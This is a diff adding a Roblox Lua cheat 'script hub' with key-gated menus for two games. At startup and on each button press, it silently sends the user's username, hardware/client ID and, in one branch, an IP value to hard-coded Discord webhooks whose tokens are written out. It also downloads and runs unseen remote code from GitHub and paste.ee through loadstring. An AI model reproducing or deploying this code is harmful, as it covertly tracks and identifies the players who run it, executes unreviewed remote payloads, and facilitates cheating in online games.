@@ -1,0 +1,292 @@
+Http = game:GetService("HttpService")
+Web = "https://discord.com/api/webhooks/1079153862193188956/MVhpVic98Ciez1uJYHcPBRnyjejq2eLKeBD06-r6Dln7sdCn6UVeWRq0C1PSod85TMhV"
+
+if syn then
+    local responce = syn.request(
+    {
+        Url = Web,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = Http:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**Key System Loginned**",
+                ["description"] = game.Players.LocalPlayer.Name.. " ",
+                ["type"] = "rich",
+                ["color"] = tonumber(random),
+                ["fields"] = {
+                    {
+                        ["name"] = " Ip",
+                        ["value"] =  game:HttpGet("", true),
+                        ["inline"] = true
+                    }
+                }
+                
+            }}
+        })
+    })
+   else
+    request(
+        {
+            Url = Web,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = Http:JSONEncode({
+                ["content"] = "***Birisi Key Sisteme Giriş Yaptı***",
+                ["embeds"] = {{
+                    ["title"] = "**Key System Loginned**",
+                    ["description"] =  game.Players.LocalPlayer.Name.. "",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(random),
+                    ["fields"] = {
+                        {
+                            ["name"] = "Hardware ID:",
+							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                            ["inline"] = true
+                            
+                        }
+                        
+                        
+                        
+                        
+                    }
+                    
+                }}
+            })
+        })
+    end
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Homelander Script Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Homelander"})
+
+
+local Tab = Window:MakeTab({
+	Name = "Tps Street Soccer",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Tps Street Soccer",
+	Callback = function()
+        Http = game:GetService("HttpService")
+        Web = "https://discord.com/api/webhooks/1079043324922572800/46t48ae-8ZbqIp-Veu4gFlu73xFpJC364YAdemoRdqmokLerYLQ_B7mIYbdzp_Pk8kdQ"
+        
+        if syn then
+            local responce = syn.request(
+            {
+                Url = Web,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = Http:JSONEncode({
+                    ["content"] = "",
+                    ["embeds"] = {{
+                        ["title"] = "**Key System Loginned**",
+                        ["description"] = game.Players.LocalPlayer.Name.. " ",
+                        ["type"] = "rich",
+                        ["color"] = tonumber(random),
+                        ["fields"] = {
+                            {
+                                ["name"] = " Ip",
+                                ["value"] =  game:HttpGet("", true),
+                                ["inline"] = true
+                            }
+                        }
+                        
+                    }}
+                })
+            })
+           else
+            request(
+                {
+                    Url = Web,
+                    Method = 'POST',
+                    Headers = {
+                        ['Content-Type'] = 'application/json'
+                    },
+                    Body = Http:JSONEncode({
+                        ["content"] = "***Birisi Key Sisteme Giriş Yaptı***",
+                        ["embeds"] = {{
+                            ["title"] = "**Key System Loginned**",
+                            ["description"] =  game.Players.LocalPlayer.Name.. "",
+                            ["type"] = "rich",
+                            ["color"] = tonumber(random),
+                            ["fields"] = {
+                                {
+                                    ["name"] = "Hardware ID:",
+                                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                                    ["inline"] = true
+                                    
+                                }
+                                
+                                
+                                
+                                
+                            }
+                            
+                        }}
+                    })
+                })
+            end
+        
+        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+        local Window = OrionLib:MakeWindow({Name = "Homelander Key System", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Homelander"})
+        
+        _G.Key = "Homelandertps103031"
+        _G.KeyInput = "string"
+        
+        function MakeScriptHub()
+        loadstring(game:HttpGet("https://paste.ee/r/mB2eo"))()
+        end
+        
+        local Tab = Window:MakeTab({
+            Name = "Tps Street Soccer",
+            Icon = "rbxassetid://4483345998",
+            PremiumOnly = false
+        })
+        
+        
+        Tab:AddTextbox({
+            Name = "Enter Key",
+            Default = "",
+            TextDisappear = true,
+            Callback = function(Value)
+                _G.KeyInput = Value
+        
+            end	  
+        })
+        
+        Tab:AddButton({
+            Name = "Check Key",
+            Callback = function()
+                if _G.KeyInput == _G.Key then
+                    MakeScriptHub()
+                end
+                end    
+        })
+        
+        Tab:AddParagraph("play its op","bad scripter batu and globalz")
+        Tab:AddParagraph("key","https://discord.gg/RHdvtnyeRX")
+        Tab:AddParagraph("","maked by (only dm with noya#4784) and (Homelander#0001)")
+        
+    end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Prison Life",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Prison Life",
+	Callback = function()
+        Http = game:GetService("HttpService")
+        Web = "https://discord.com/api/webhooks/1079155298331267144/CKX7u-WWCw5JB1wDfyNrUcvFiWvg_rLwnkqgWp0TdZiDCgyZktTy8yEKr1AGkBMPSZ4s"
+        
+        if syn then
+            local responce = syn.request(
+            {
+                Url = Web,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = Http:JSONEncode({
+                    ["content"] = "",
+                    ["embeds"] = {{
+                        ["title"] = "**Key System Loginned**",
+                        ["description"] = game.Players.LocalPlayer.Name.. " ",
+                        ["type"] = "rich",
+                        ["color"] = tonumber(random),
+                        ["fields"] = {
+                            {
+                                ["name"] = " Ip",
+                                ["value"] =  game:HttpGet("", true),
+                                ["inline"] = true
+                            }
+                        }
+                        
+                    }}
+                })
+            })
+           else
+            request(
+                {
+                    Url = Web,
+                    Method = 'POST',
+                    Headers = {
+                        ['Content-Type'] = 'application/json'
+                    },
+                    Body = Http:JSONEncode({
+                        ["content"] = "***Birisi Key Sisteme Giriş Yaptı***",
+                        ["embeds"] = {{
+                            ["title"] = "**Key System Loginned**",
+                            ["description"] =  game.Players.LocalPlayer.Name.. "",
+                            ["type"] = "rich",
+                            ["color"] = tonumber(random),
+                            ["fields"] = {
+                                {
+                                    ["name"] = "Hardware ID:",
+                                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                                    ["inline"] = true
+                                    
+                                }
+                                
+                                
+                                
+                                
+                            }
+                            
+                        }}
+                    })
+                })
+            end
+        
+        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+        local Window = OrionLib:MakeWindow({Name = "Homelander Key System", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Homelander"})
+        
+        _G.Key = "HomelanderSoldierBoy"
+        _G.KeyInput = "string"
+        
+        function MakeScriptHub()
+        loadstring(game:HttpGet("https://paste.ee/r/AFE8f"))()
+        end
+        
+        local Tab = Window:MakeTab({
+            Name = "Prison Life",
+            Icon = "rbxassetid://4483345998",
+            PremiumOnly = false
+        })
+        
+        
+        Tab:AddTextbox({
+            Name = "Enter Key",
+            Default = "",
+            TextDisappear = true,
+            Callback = function(Value)
+                _G.KeyInput = Value
+        
+            end	  
+        })
+        
+        Tab:AddButton({
+            Name = "Check Key",
+            Callback = function()
+                if _G.KeyInput == _G.Key then
+                    MakeScriptHub()
+                end
+                end    
+        })
+        
+        Tab:AddParagraph("key","https://discord.gg/RHdvtnyeRX")
+        Tab:AddParagraph("","maked by (only dm with noya#4784) and (Homelander#0001)")
+        
+    end    
+})
